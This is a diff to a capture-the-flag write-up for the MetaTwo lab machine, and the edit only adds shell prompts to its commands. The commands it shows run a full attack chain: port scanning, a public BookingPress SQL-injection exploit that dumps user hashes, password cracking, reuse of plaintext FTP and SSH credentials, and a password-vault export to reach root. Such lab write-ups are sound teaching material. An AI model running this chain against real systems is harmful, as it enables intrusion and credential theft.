@@ -20,8 +20,8 @@ MetaTwo is an easy Linux box that chains two named CVEs cleanly. An unauthentica
 Full sweep, then scripts and versions:
 
 ```bash
-nmap -p- --min-rate 10000 10.10.11.186
-nmap -p 21,22,80 -sCV 10.10.11.186
+$ nmap -p- --min-rate 10000 10.10.11.186
+$ nmap -p 21,22,80 -sCV 10.10.11.186
 ```
 
 Three ports:
@@ -83,7 +83,7 @@ action=bookingpress_front_get_category_services&_wpnonce=f071f53b5a&category_id=
 With the nonce I ran the public PoC, which automates the version fingerprint and then dumps `wp_users`:
 
 ```bash
-python3 booking-press-expl.py -u http://metapress.htb -n 'f071f53b5a'
+$ python3 booking-press-expl.py -u http://metapress.htb -n 'f071f53b5a'
 ```
 
 The core of that script is two payloads, a count trigger and a per-row gainer, both keeping the nine-column UNION shape:
@@ -105,7 +105,7 @@ It dumped the WordPress user hashes:
 Both are phpass (`$P$`) hashes. John cracked the manager:
 
 ```bash
-john wp.hashes --wordlist=/usr/share/wordlists/rockyou.txt --user
+$ john wp.hashes --wordlist=/usr/share/wordlists/rockyou.txt --user
 ```
 
 ```
@@ -187,7 +187,7 @@ define( 'FTP_SSL', false );
 The FTP creds opened the ProFTPD service from port 21:
 
 ```bash
-ftp metapress.htb@metapress.htb   # 9NYS_ii@FyL_p5M2NvJ
+$ ftp metapress.htb@metapress.htb   # 9NYS_ii@FyL_p5M2NvJ
 ```
 
 Alongside `blog/` was a `mailer/` directory holding `send_email.php`, a PHPMailer script with hardcoded SMTP credentials for jnelson:
@@ -202,7 +202,7 @@ $mail->Port     = 587;
 Those SMTP credentials are reused for SSH, which is the kind of reuse this box keeps rewarding:
 
 ```bash
-ssh jnelson@10.10.11.186   # Cb4_JmWM8zUZWMu@Ys
+$ ssh jnelson@10.10.11.186   # Cb4_JmWM8zUZWMu@Ys
 ```
 
 That gave the user flag.
@@ -246,9 +246,9 @@ blink182
 That is not the root password, it is the passphrase that unlocks the passpie store. Back on the box, I exported the vault with it. Either `export` to a YAML file or a direct `copy` to stdout works:
 
 ```bash
-passpie export pass.yml --passphrase blink182
+$ passpie export pass.yml --passphrase blink182
 # or
-passpie --passphrase blink182 copy --to stdout root@ssh
+$ passpie --passphrase blink182 copy --to stdout root@ssh
 ```
 
 The export revealed the root SSH password:
@@ -262,7 +262,7 @@ password: !!python/unicode 'p7qfAZt4_A1xo_0x'
 `su` with that finished the box:
 
 ```bash
-su -   # p7qfAZt4_A1xo_0x
+$ su -   # p7qfAZt4_A1xo_0x
 ```
 
 That gave the root flag.
